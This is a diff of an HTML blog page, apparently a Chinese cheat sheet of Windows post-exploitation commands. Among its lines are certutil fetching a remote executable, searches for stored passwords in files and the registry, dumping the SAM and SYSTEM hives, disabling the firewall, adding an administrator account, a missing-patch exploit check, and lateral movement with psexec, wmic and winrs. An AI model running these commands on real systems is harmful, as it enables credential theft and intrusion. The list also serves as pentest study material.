@@ -109,91 +109,128 @@ https://blog.csdn.net/qq_45174221/article/details/104979705
 http://t3ngyu.leanote.com/post/LM-WinRM-WinRS
 https://blog.csdn.net/qq_20307987/article/details/85087960
 </pre></div>
-<div class="highlight"><pre><span></span>ifconfig /all 获取获取域名、IP地址、DHCP服务器、网关、MAC地址、主机名
-net <span class="nb">time</span> /domain 查看域名、时间
-net view /domain 查看域内所有共享
-net view ip 查看对方局域网内开启了哪些共享
-net config workstation 查看域名、机器名等
-net user 用户名 密码 /add 建立用户
-net user 用户名 /del <span class="c1">#删除用户</span>
-net user guest /active:yes 激活guest账户
-net user 查看账户
-net user 账户名 查看指定账户信息
-net user /domain 查看域内有哪些用户，Windows NT Workstation 计算机上可用，由此可以此判断用户是否是域成员。
-net user 用户名 /domain 查看账户信息
-net group /domain 查看域中的组
-net group <span class="s2">"domain admins"</span> /domain 查看当前域的管理用户
-query user 查看当前在线的用户
-net localgroup 查看所有的本地组
-net localgroup administrators 查看administrators组中有哪些用户
-net localgroup administrators 用户名 /add 把用户添加到管理员组中
-net start 查看开启服务
-net start 服务名 开启某服务
-net stop 服务名 停止某服务
-net share 查看本地开启的共享
-net share ipc$ 开启ipc$共享
-net share ipc$ /del 删除ipc$共享
-net share c$ /del 删除C：共享
-dsquery server 查看所有域控制器
-dsquery subnet 查看域内内子网
-dsquery group 查看域内工作组
-dsquery site 查看域内站点
-netstat -a 查看开启了哪些端口,常用netstat -an
-netstat -n 查看端口的网络连接情况，常用netstat -an
-netstat -v 查看正在进行的工作
-netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）
-netstat -s 查看正在使用的所有协议使用情况
-nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写
-reg save hklm<span class="se">\s</span>am sam.hive 导出用户组信息、权限配置
-reg save hklm<span class="se">\s</span>ystem system.hive 导出SYSKEY
-net use <span class="se">\\</span>目标IP<span class="se">\i</span>pc$ 密码 /u:用户名 连接目标机器
-at <span class="se">\\</span>目标IP <span class="m">21</span>:31 c:<span class="se">\s</span>erver.exe 在某个时间启动某个应用
-wmic /node:<span class="s2">"目标IP"</span> /password:<span class="s2">"123456"</span> /user:<span class="s2">"admin"</span> 连接目标机器
-psexec.exe <span class="se">\\</span>目标IP -u username -p password -s cmd 在目标机器上执行cmd
-finger username @host 查看最近有哪些用户登陆
-route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface
-arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。
-arp -a 将显示出全部信息
-nslookup IP地址侦测器
-tasklist 查看当前进程
-taskkill /pid PID数 终止指定PID进程
-whoami 查看当前用户及权限
-systeminfo 查看计算机信息（版本，位数，补丁情况）
-ver 查看计算机操作系统版本
-tasklist /svc 查看当前计算机进程情况
-netstat -ano 查看当前计算机进程情况
+<div class="highlight"><pre><span></span>certutil-----从远程url下载文件
+案例:certutil -urlcache  -split  -f http://baidu.com/test.exe
 
-wmic product &gt; ins.txt 查看安装软件以及版本路径等信息，重定向到ins.txt
-wmic bios ----- 查看bios信息
-wmic qfe ----- 查看补丁信息
-wmic qfe get hotfixid ----- 查看补丁-Patch号
-wmic startup ----- 查看启动项
-wmic service ----- 查看服务
-wmic os ----- 查看OS信息
+findstr-----查找文件后缀结果
+findstr /s /i <span class="s2">"pass"</span> *.py*
 
-wmic process get caption,executablepath,commandline
-wmic process call create “process_name” <span class="o">(</span>executes a program<span class="o">)</span>
-wmic process where <span class="nv">name</span><span class="o">=</span>”process_name” call terminate <span class="o">(</span>terminates program<span class="o">)</span>
-wmic logicaldisk where <span class="nv">drivetype</span><span class="o">=</span><span class="m">3</span> get name, freespace, systemname, filesystem, size,
-volumeserialnumber <span class="o">(</span>hard drive information<span class="o">)</span>
-wmic useraccount <span class="o">(</span>usernames, sid, and various security related goodies<span class="o">)</span>
-wmic useraccount get /ALL
-wmic share get /ALL <span class="o">(</span>you can use ? <span class="k">for</span> gets <span class="nb">help</span> ! <span class="o">)</span>
-wmic startup list full <span class="o">(</span>this can be a huge list!!!<span class="o">)</span>
-wmic /node:“hostname” bios get serialnumber <span class="o">(</span>this can be great <span class="k">for</span> finding warranty info about target<span class="o">)</span>
+reg query HKLM /f password /t REG_SZ /s-----搜集注册表中的各种密码数据
+
+查看有没有开启远程链接，运行下面命令：
+REG QUERY <span class="s2">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections
+结果：1表示关闭，0表示开启
+
+快速查找未打补丁的exp
+systeminfo&gt;bzhack.txt<span class="p">&amp;</span><span class="o">(</span><span class="k">for</span> %i in <span class="o">(</span> KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 <span class="o">)</span> <span class="k">do</span> @type bzhack.txt<span class="p">|</span>@find /i <span class="s2">"%i"</span><span class="o">||</span> @echo %i you can exp<span class="o">)</span><span class="p">&amp;</span>del /f /q /a bzhack.txt
 
 
-winrs -r:https://myserver.com <span class="nb">command</span>
-winrs -r:myserver.com -usessl <span class="nb">command</span>
-winrs -r:myserver <span class="nb">command</span>
-winrs -r:http://127.0.0.1 <span class="nb">command</span>
-winrs -r:http://169.51.2.101:80 -unencrypted <span class="nb">command</span>
-winrs -r:https://<span class="o">[</span>::FFFF:129.144.52.38<span class="o">]</span> <span class="nb">command</span>
-winrs -r:http://<span class="o">[</span><span class="m">1080</span>:0:0:0:8:800:200C:417A<span class="o">]</span>:80 <span class="nb">command</span>
-winrs -r:https://myserver.com -t:600 -u:administrator -p:$%fgh7 ipconfig
-winrs -r:myserver -env:PATH<span class="o">=</span>^%PATH^%<span class="p">;</span>c:<span class="se">\t</span>ools -env:TEMP<span class="o">=</span>d:<span class="se">\t</span>emp config.cmd
-winrs -r:myserver netdom join myserver /domain:testdomain /userd:johns /passwordd:$%fgh789
-winrs -r:myserver -ad -u:administrator -p:$%fgh7 dir <span class="se">\\</span>anotherserver<span class="se">\s</span>hare
+
+md     建文件夹
+rd     删除文件夹
+tree    显示文件夹结构
+dir     显示磁盘目录内容
+copy    复制文件
+Xcopy   copy加强版，复制文件夹
+del     删除文件
+ren     <span class="o">[</span>原文件/夹名<span class="o">][</span>新文件/夹名<span class="o">]</span>修改文件名
+<span class="nb">type</span>    查看文本内容
+dir /a /s /b d:<span class="se">\"</span>*.conf<span class="s2">"        搜索d盘里conf结尾的文件</span>
+<span class="s2">edit        文本编辑</span>
+<span class="s2">type        显示文件内容</span>
+
+<span class="s2">hostname                 查看机器名  </span>
+<span class="s2">cls                      清屏</span>
+<span class="s2">net start                查看开启的服务，比如Terminal Services 远程连接服务</span>
+<span class="s2">net stop sharedaccess    关闭防火墙</span>
+<span class="s2">set                      查看当前机器的环境变量,看有没有我们可以直接利用到的语言环境</span>
+<span class="s2">fsutil fsinfo drives     列出当前机器上的所有盘符</span>
+
+<span class="s2">ifconfig /all 获取获取域名、IP地址、DHCP服务器、网关、MAC地址、主机名</span>
+<span class="s2">net time /domain 查看域名、时间</span>
+<span class="s2">net view /domain 查看域内所有共享</span>
+<span class="s2">net view ip 查看对方局域网内开启了哪些共享</span>
+<span class="s2">net config workstation 查看域名、机器名等</span>
+<span class="s2">net user 用户名 密码 /add 建立用户</span>
+<span class="s2">net user 用户名 /del #删除用户</span>
+<span class="s2">net user guest /active:yes 激活guest账户</span>
+<span class="s2">net user 查看账户</span>
+<span class="s2">net user 账户名 查看指定账户信息</span>
+<span class="s2">net user /domain 查看域内有哪些用户，Windows NT Workstation 计算机上可用，由此可以此判断用户是否是域成员。</span>
+<span class="s2">net user 用户名 /domain 查看账户信息</span>
+<span class="s2">net group /domain 查看域中的组</span>
+<span class="s2">net group "</span>domain admins<span class="s2">" /domain 查看当前域的管理用户</span>
+<span class="s2">query user 查看当前在线的用户</span>
+<span class="s2">net localgroup 查看所有的本地组</span>
+<span class="s2">net localgroup administrators 查看administrators组中有哪些用户</span>
+<span class="s2">net localgroup administrators 用户名 /add 把用户添加到管理员组中</span>
+<span class="s2">net start 查看开启服务</span>
+<span class="s2">net start 服务名 开启某服务</span>
+<span class="s2">net stop 服务名 停止某服务</span>
+<span class="s2">net share 查看本地开启的共享</span>
+<span class="s2">net share ipc</span>$<span class="s2"> 开启ipc</span>$<span class="s2">共享</span>
+<span class="s2">net share ipc</span>$<span class="s2"> /del 删除ipc</span>$<span class="s2">共享</span>
+<span class="s2">net share c</span>$<span class="s2"> /del 删除C：共享</span>
+<span class="s2">dsquery server 查看所有域控制器</span>
+<span class="s2">dsquery subnet 查看域内内子网</span>
+<span class="s2">dsquery group 查看域内工作组</span>
+<span class="s2">dsquery site 查看域内站点</span>
+<span class="s2">netstat -a 查看开启了哪些端口,常用netstat -an</span>
+<span class="s2">netstat -n 查看端口的网络连接情况，常用netstat -an</span>
+<span class="s2">netstat -v 查看正在进行的工作</span>
+<span class="s2">netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）</span>
+<span class="s2">netstat -s 查看正在使用的所有协议使用情况</span>
+<span class="s2">nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写</span>
+<span class="s2">reg save hklm\sam sam.hive 导出用户组信息、权限配置</span>
+<span class="s2">reg save hklm\system system.hive 导出SYSKEY</span>
+<span class="s2">net use \\目标IP\ipc</span>$<span class="s2"> 密码 /u:用户名 连接目标机器</span>
+<span class="s2">at \\目标IP 21:31 c:\server.exe 在某个时间启动某个应用</span>
+<span class="s2">wmic /node:"</span>目标IP<span class="s2">" /password:"</span><span class="m">123456</span><span class="s2">" /user:"</span>admin<span class="s2">" 连接目标机器</span>
+<span class="s2">psexec.exe \\目标IP -u username -p password -s cmd 在目标机器上执行cmd</span>
+<span class="s2">finger username @host 查看最近有哪些用户登陆</span>
+<span class="s2">route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface</span>
+<span class="s2">arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。</span>
+<span class="s2">arp -a 将显示出全部信息</span>
+<span class="s2">nslookup IP地址侦测器</span>
+<span class="s2">tasklist 查看当前进程</span>
+<span class="s2">taskkill /pid PID数 终止指定PID进程</span>
+<span class="s2">whoami 查看当前用户及权限</span>
+<span class="s2">systeminfo 查看计算机信息（版本，位数，补丁情况）</span>
+<span class="s2">ver 查看计算机操作系统版本</span>
+<span class="s2">tasklist /svc 查看当前计算机进程情况</span>
+<span class="s2">netstat -ano 查看当前计算机进程情况</span>
+
+<span class="s2">wmic product &gt; ins.txt 查看安装软件以及版本路径等信息，重定向到ins.txt</span>
+<span class="s2">wmic bios ----- 查看bios信息</span>
+<span class="s2">wmic qfe ----- 查看补丁信息</span>
+<span class="s2">wmic qfe get hotfixid ----- 查看补丁-Patch号</span>
+<span class="s2">wmic startup ----- 查看启动项</span>
+<span class="s2">wmic service ----- 查看服务</span>
+<span class="s2">wmic os ----- 查看OS信息</span>
+
+<span class="s2">wmic process get caption,executablepath,commandline</span>
+<span class="s2">wmic process call create “process_name” (executes a program)</span>
+<span class="s2">wmic process where name=”process_name” call terminate (terminates program)</span>
+<span class="s2">wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size,</span>
+<span class="s2">volumeserialnumber (hard drive information)</span>
+<span class="s2">wmic useraccount (usernames, sid, and various security related goodies)</span>
+<span class="s2">wmic useraccount get /ALL</span>
+<span class="s2">wmic share get /ALL (you can use ? for gets help ! )</span>
+<span class="s2">wmic startup list full (this can be a huge list!!!)</span>
+<span class="s2">wmic /node:“hostname” bios get serialnumber (this can be great for finding warranty info about target)</span>
+
+
+<span class="s2">winrs -r:https://myserver.com command</span>
+<span class="s2">winrs -r:myserver.com -usessl command</span>
+<span class="s2">winrs -r:myserver command</span>
+<span class="s2">winrs -r:http://127.0.0.1 command</span>
+<span class="s2">winrs -r:http://169.51.2.101:80 -unencrypted command</span>
+<span class="s2">winrs -r:https://[::FFFF:129.144.52.38] command</span>
+<span class="s2">winrs -r:http://[1080:0:0:0:8:800:200C:417A]:80 command</span>
+<span class="s2">winrs -r:https://myserver.com -t:600 -u:administrator -p:</span>$<span class="s2">%fgh7 ipconfig</span>
+<span class="s2">winrs -r:myserver -env:PATH=^%PATH^%;c:\tools -env:TEMP=d:\temp config.cmd</span>
+<span class="s2">winrs -r:myserver netdom join myserver /domain:testdomain /userd:johns /passwordd:</span>$<span class="s2">%fgh789</span>
+<span class="s2">winrs -r:myserver -ad -u:administrator -p:</span>$<span class="s2">%fgh7 dir \\anotherserver\share</span>
 </pre></div>
   </div>
 </article>
